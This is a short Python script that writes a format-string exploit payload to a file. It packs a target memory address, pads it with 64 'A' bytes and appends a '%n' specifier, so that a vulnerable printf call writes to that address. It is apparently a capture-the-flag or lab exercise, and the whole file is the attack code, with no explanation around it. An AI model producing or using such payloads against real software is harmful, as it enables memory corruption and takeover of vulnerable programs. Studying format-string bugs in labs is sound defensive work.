#!/bin/python

import struct

# Define the target address where you want to write
target_address = 0x0804a02a  # Replace with your target address

# Construct the payload
payload = struct.pack("<I", target_address) + b"A" * 64 + b"%n"

# Final payload
with open("payload.txt", 'wb') as f:
    f.write(payload)

